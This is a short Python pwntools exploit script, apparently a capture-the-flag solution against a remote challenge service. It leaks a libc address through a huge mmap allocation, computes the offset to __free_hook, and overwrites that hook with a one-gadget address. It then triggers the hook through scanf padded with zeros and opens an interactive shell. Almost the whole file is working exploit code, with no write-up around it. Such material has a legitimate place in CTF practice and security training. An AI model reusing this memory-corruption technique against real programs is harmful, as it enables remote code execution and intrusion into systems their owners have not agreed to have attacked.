#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

p = remote('mc.ax', 31547)

# we allocate a big bloc, to make it mmap just before libc
p.sendlineafter('big?\n', str(256*1024*1024)+' '*1000000)
print(str(256*1024*1024))

# offset to libc from bloc
offset = 0x10000ff0

p.recvuntil('here: ', drop=True)
leak = int(p.recvuntil('\n', drop=True),16)

libc_base = leak + offset
print('libc base = {:#x}'.format(libc_base))

# offset to __free_hook
offset2 = (offset + 0x1bd8e8)/8
p.sendlineafter('far?\n', str(offset2)+' '*1000000)
print(str(offset2))

onegadgets=[0x4484f, 0x448a3, 0xe5456]

#launch free hook using a lot of 0 before number in scanf
p.sendlineafter('what?\n', '0'*10000+str(libc_base+onegadgets[1]))

p.interactive()

